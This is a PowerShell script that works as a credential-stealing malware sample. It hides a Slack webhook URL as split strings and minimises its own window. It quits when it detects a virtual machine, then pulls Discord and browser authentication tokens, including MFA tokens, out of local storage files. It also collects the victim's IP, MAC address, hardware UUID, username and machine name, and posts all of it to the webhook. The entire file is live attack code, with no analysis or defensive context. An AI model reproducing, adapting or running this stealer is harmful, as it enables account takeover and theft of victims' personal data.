
$uriSlack = "https://h"+"ook"+"s.sla"+"ck"+".com/serv"+"ices/T01Q"+"U9DSY2U/B050"+"L0VV73R/"+"2Xf6XxXxhAXOO"+"zgxxWrz9Tf3"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic
[Microsoft.VisualBasic.Interaction]::AppActivate("Windows PowerShell")
[System.Windows.Forms.SendKeys]::SendWait("% n")
$roaming=$env:APPDATA
$local=$env:LOCALAPPDATA
$db_path=@("$roaming\Discord\Local Storage\leveldb","$roaming\discordcanary\Local Storage\leveldb","$roaming\discordptb\Local Storage\leveldb","$roaming\Lightcord\Local Storage\leveldb","$roaming\DiscordDevelopment\Local Storage\leveldb","$roaming\Opera Software\Opera Stable\Local Storage\leveldb","$roaming\Opera Software\Opera GX Stable\Local Storage\leveldb","$local\Amigo\User Data\Local Storage\leveldb","$local\Torch\User Data\Local Storage\leveldb","$local\Kometa\User Data\Local Storage\leveldb","$local\Orbitum\User Data\Local Storage\leveldb","$local\CentBrowser\User Data\Local Storage\leveldb","$local\7Star\7Star\User Data\Local Storage\leveldb","$local\Sputnik\Sputnik\User Data\Local Storage\leveldb","$local\Vivaldi\User Data\Default\Local Storage\leveldb","$local\Google\Chrome SxS\User Data\Local Storage\leveldb","$local\Epic Privacy Browser\User Data\Local Storage\leveldb","$local\Google\Chrome\User Data\Default\Local Storage\leveldb","$local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb","$local\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb","$local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb","$local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
$vmcheck = Get-WmiObject -Query "Select * From Win32_CacheMemory"
if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
    
    $token = new-object System.Collections.Specialized.StringCollection
    foreach ($path in $db_path) {
        if (Test-Path $path) {
            try {
                foreach ($file in Get-ChildItem -Path $path -Name) {
                    $data = Get-Content -Path "$($path)\$($file)" -ErrorAction SilentlyContinue -Force
                    $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{38}|mfa\.[\w-]{84}"
                    $match = $regex.Match($data)
                    while ($match.Success) {
                        if (!$token.Contains($match.Value)) {
                            $token.Add($match.Value) | out-null
                        }
                    $match = $match.NextMatch()
                    }
                }
            } catch {Out-Null -ErrorAction SilentlyContinue}
        }
    }
    $ip = (Invoke-RestMethod -Uri "http://ipwhois.app/json/" -Method GET).ip
    $uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $guid = ([guid]::NewGuid().guid).split("`n")[0]
    $mac = (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress[0]
    $cpu = (Get-CimInstance -ClassName 'Win32_Processor' | Select-Object -First '1').Name
    $localip = [net.dns]::GetHostAddresses("") | Select-Object -Expa IP*
    foreach ($ips in $localip) {
        $locip = [string]::Concat($locip, "&&", $ips)
    }
    foreach ($data in $token) {
        $tokens = @{
            token=$data
            ip = $ip
            uuid = $uuid
            guid = $guid
            mac = $mac
            cpu = $cpu
            localip = $locip
            username = $env:USERNAME
            pcname = $env:COMPUTERNAME
            os = $env:OS
        }


        
        $result = $tokens | ForEach-Object { $_ } | Out-String




        # Construct the payload for the Slack message
        $payload = @{
            channel = $uriSlack.Split("/")[-2]
            text = "Here's a file for you!"
            attachments = @(
                @{
                    fallback = "File upload"
                    title = "out.txt"
                    title_link = "https://example.com"
                    text = $result
                    color = "good"
                    
                }
            )
        }

        # Convert the payload to JSON
        $jsonPayload = $payload | ConvertTo-Json

        # Send the Slack message using the webhook URL
        Invoke-RestMethod -Uri $uriSlack -Method Post -Body $jsonPayload
       
    }

    

    
}
